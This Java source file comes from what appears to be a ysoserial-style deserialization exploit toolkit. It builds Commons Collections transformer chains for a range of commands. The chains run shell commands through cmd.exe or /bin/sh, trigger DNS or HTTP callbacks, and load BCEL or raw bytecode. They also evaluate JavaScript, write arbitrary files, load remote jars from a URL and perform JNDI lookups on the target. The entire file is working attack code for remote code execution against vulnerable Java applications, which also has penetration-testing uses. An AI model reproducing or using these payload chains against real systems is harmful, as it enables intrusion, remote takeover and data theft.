package me.gv7.woodpecker.yso.payloads.custom;

import java.io.FileOutputStream;
import java.net.InetAddress;
import java.net.URL;
import java.net.URLClassLoader;
import javax.naming.InitialContext;
import javax.script.ScriptEngineManager;
import me.gv7.woodpecker.bcel.HackBCELs;
import me.gv7.woodpecker.yso.payloads.util.BASE64Decoder;
import me.gv7.woodpecker.yso.payloads.util.CommonUtil;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;

public class CommonsCollectionsUtil {

    public CommonsCollectionsUtil() {
    }

    public static Transformer[] getTransformerList(String command) throws Exception {
        Transformer[] transformers = null;
        if (command.toLowerCase().startsWith("sleep:")) {
            int time = Integer.valueOf(command.substring("sleep:".length())) * 1000;
            transformers = new Transformer[]{new ConstantTransformer(Thread.class), new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"sleep", new Class[]{Long.TYPE}}), new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[]{(long)time}}), new ConstantTransformer(1)};
        } else {
            String jndiURL;
            if (command.toLowerCase().startsWith("dnslog:")) {
                jndiURL = command.substring("dnslog:".length());
                transformers = new Transformer[]{new ConstantTransformer(InetAddress.class), new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getAllByName", new Class[]{String.class}}), new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[]{jndiURL}}), new ConstantTransformer(1)};
            } else if (command.toLowerCase().startsWith("httplog:")) {
                jndiURL = command.substring("httplog:".length());
                transformers = new Transformer[]{new ConstantTransformer(URL.class), new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[]{String.class}}), new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[]{jndiURL}}), new InvokerTransformer("getContent", new Class[0], new Object[0]), new ConstantTransformer(1)};
            } else if (command.toLowerCase().startsWith("raw_cmd:")) {
                jndiURL = command.substring("raw_cmd:".length());
                transformers = new Transformer[]{new ConstantTransformer(Runtime.class), new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}), new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{jndiURL}), new ConstantTransformer(1)};
            } else if (command.toLowerCase().startsWith("win_cmd:")) {
                jndiURL = command.substring("win_cmd:".length());
                transformers = new Transformer[]{new ConstantTransformer(Runtime.class), new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}), new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer("exec", new Class[]{String[].class}, new Object[]{new String[]{"cmd.exe", "/c", jndiURL}}), new ConstantTransformer(1)};
            } else if (command.toLowerCase().startsWith("linux_cmd:")) {
                jndiURL = command.substring("linux_cmd:".length());
                transformers = new Transformer[]{new ConstantTransformer(Runtime.class), new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}), new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer("exec", new Class[]{String[].class}, new Object[]{new String[]{"/bin/sh", "-c", jndiURL}}), new ConstantTransformer(1)};
            } else if (command.toLowerCase().startsWith("bcel:")) {
                jndiURL = command.substring("bcel:".length());
                Class bcelClazz = CommonUtil.getClass("com.sun.org.apache.bcel.internal.util.ClassLoader");
                transformers = new Transformer[]{new ConstantTransformer(bcelClazz), new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[0]}), new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new String[0]}), new InvokerTransformer("loadClass", new Class[]{String.class}, new Object[]{jndiURL}), new InvokerTransformer("newInstance", new Class[0], new Object[0]), new ConstantTransformer(1)};
            } else {
                String className;
                Class bcelClazz;
                if (command.toLowerCase().startsWith("bcel_class_file:")) {
                    jndiURL = command.substring("bcel_class_file:".length());
                    byte[] byteCode = CommonUtil.getFileBytes(jndiURL);
                    className = HackBCELs.encode(byteCode);
                    bcelClazz = CommonUtil.getClass("com.sun.org.apache.bcel.internal.util.ClassLoader");
                    transformers = new Transformer[]{new ConstantTransformer(bcelClazz), new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[0]}), new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new String[0]}), new InvokerTransformer("loadClass", new Class[]{String.class}, new Object[]{className}), new InvokerTransformer("newInstance", new Class[0], new Object[0]), new ConstantTransformer(1)};
                } else {
                    String jarPath;
                    if (command.toLowerCase().startsWith("bcel_with_args:")) {
                        jndiURL = command.substring("bcel_with_args:".length());
                        jarPath = jndiURL.split("\\|")[0];
                        className = jndiURL.split("\\|")[1];
                        bcelClazz = CommonUtil.getClass("com.sun.org.apache.bcel.internal.util.ClassLoader");
                        transformers = new Transformer[]{new ConstantTransformer(bcelClazz), new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[0]}), new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new String[0]}), new InvokerTransformer("loadClass", new Class[]{String.class}, new Object[]{jarPath}), new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[]{String.class}}), new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new String[]{className}}), new ConstantTransformer(1)};
                    } else if (command.toLowerCase().startsWith("bcel_class_file_with_args:")) {
                        jndiURL = command.substring("bcel_class_file_with_args:".length());
                        jarPath = HackBCELs.encode(jndiURL.split("\\|")[0]);
                        className = jndiURL.split("\\|")[1];
                        bcelClazz = CommonUtil.getClass("com.sun.org.apache.bcel.internal.util.ClassLoader");
                        transformers = new Transformer[]{new ConstantTransformer(bcelClazz), new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[0]}), new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new String[0]}), new InvokerTransformer("loadClass", new Class[]{String.class}, new Object[]{jarPath}), new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[]{String.class}}), new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new String[]{className}}), new ConstantTransformer(1)};
                    } else if (command.toLowerCase().startsWith("script_file:")) {
                        jndiURL = command.substring("script_file:".length());
                        jarPath = new String(CommonUtil.readFileByte(jndiURL));
                        transformers = new Transformer[]{new ConstantTransformer(ScriptEngineManager.class), new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[0]}), new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[0]}), new InvokerTransformer("getEngineByName", new Class[]{String.class}, new Object[]{"js"}), new InvokerTransformer("eval", new Class[]{String.class}, new Object[]{jarPath}), new ConstantTransformer(1)};
                    } else if (command.toLowerCase().startsWith("script_base64:")) {
                        jndiURL = command.substring("script_base64:".length());
                        jndiURL = new String((new BASE64Decoder()).decodeBuffer(jndiURL));
                        transformers = new Transformer[]{new ConstantTransformer(ScriptEngineManager.class), new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[0]}), new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[0]}), new InvokerTransformer("getEngineByName", new Class[]{String.class}, new Object[]{"js"}), new InvokerTransformer("eval", new Class[]{String.class}, new Object[]{jndiURL}), new ConstantTransformer(1)};
                    } else {
                        byte[] fileContent;
                        if (command.toLowerCase().startsWith("upload_file_base64:")) {
                            jndiURL = command.substring("upload_file_base64:".length());
                            jarPath = jndiURL.split("\\|")[0];
                            className = jndiURL.split("\\|")[1];
                            fileContent = (new BASE64Decoder()).decodeBuffer(className);
                            transformers = new Transformer[]{new ConstantTransformer(FileOutputStream.class), new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[]{String.class}}), new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[]{jarPath}}), new InvokerTransformer("write", new Class[]{byte[].class}, new Object[]{fileContent}), new ConstantTransformer(1)};
                        } else if (command.toLowerCase().startsWith("upload_file:")) {
                            jndiURL = command.substring("upload_file:".length());
                            jarPath = jndiURL.split("\\|")[0];
                            className = jndiURL.split("\\|")[1];
                            fileContent = CommonUtil.getFileBytes(jarPath);
                            transformers = new Transformer[]{new ConstantTransformer(FileOutputStream.class), new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[]{String.class}}), new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[]{className}}), new InvokerTransformer("write", new Class[]{byte[].class}, new Object[]{fileContent}), new ConstantTransformer(1)};
                        } else if (command.toLowerCase().startsWith("loadjar:")) {
                            jndiURL = command.substring("loadjar:".length());
                            jarPath = jndiURL.split("\\|")[0];
                            className = jndiURL.split("\\|")[1];
                            transformers = new Transformer[]{new ConstantTransformer(URLClassLoader.class), new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[]{URL[].class}}), new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[]{new URL[]{new URL(jarPath)}}}), new InvokerTransformer("loadClass", new Class[]{String.class}, new Object[]{className}), new InvokerTransformer("newInstance", new Class[0], new Object[0]), new ConstantTransformer(1)};
                        } else if (command.toLowerCase().startsWith("loadjar_with_args:")) {
                            jndiURL = command.substring("loadjar_with_args:".length());
                            jarPath = jndiURL.split("\\|")[0];
                            className = jndiURL.split("\\|")[1];
                            String args = jndiURL.split("\\|")[2];
                            transformers = new Transformer[]{new ConstantTransformer(URLClassLoader.class), new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[]{URL[].class}}), new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[]{new URL[]{new URL(jarPath)}}}), new InvokerTransformer("loadClass", new Class[]{String.class}, new Object[]{className}), new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[]{String.class}}), new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[]{args}}), new ConstantTransformer(1)};
                        } else if (command.toLowerCase().startsWith("mozilla_defining_class_loader:")) {
                            // 新增: mozilla_defining_class_loader 支持
                            // 使用 org.mozilla.javascript.DefiningClassLoader 加载任意类
                            // 参数格式: mozilla_defining_class_loader:className|base64Bytes
                            jndiURL = command.substring("mozilla_defining_class_loader:".length());
                            className = jndiURL.split("\\|")[0];
                            String base64Bytes = jndiURL.split("\\|")[1];
                            byte[] classBytes = (new BASE64Decoder()).decodeBuffer(base64Bytes);
                            
                            // 尝试获取 DefiningClassLoader 类
                            Class<?> classloaderClass;
                            try {
                                classloaderClass = Class.forName("org.mozilla.javascript.DefiningClassLoader");
                            } catch (Exception e) {
                                classloaderClass = Class.forName("org.mozilla.classfile.DefiningClassLoader");
                            }
                            
                            transformers = new Transformer[]{
                                new ConstantTransformer(classloaderClass),
                                new InvokerTransformer("getDeclaredConstructor", new Class[]{Class[].class}, new Object[]{new Class[0]}),
                                new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[0]}),
                                new InvokerTransformer("defineClass", new Class[]{String.class, byte[].class}, new Object[]{className, classBytes}),
                                new InvokerTransformer("getDeclaredConstructor", new Class[]{Class[].class}, new Object[]{new Class[0]}),
                                new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[0]}),
                                new ConstantTransformer(1)
                            };
                        } else if (command.toLowerCase().startsWith("jndi:")) {
                            jndiURL = command.substring("jndi:".length());
                            transformers = new Transformer[]{new ConstantTransformer(InitialContext.class), new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[0]}), new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[0]}), new InvokerTransformer("lookup", new Class[]{String.class}, new Object[]{jndiURL}), new ConstantTransformer(1)};
                        } else {
                            throw new Exception(String.format("Command [%s] not supported", command));
                        }
                    }
                }
            }
        }
        return transformers;
    }
}

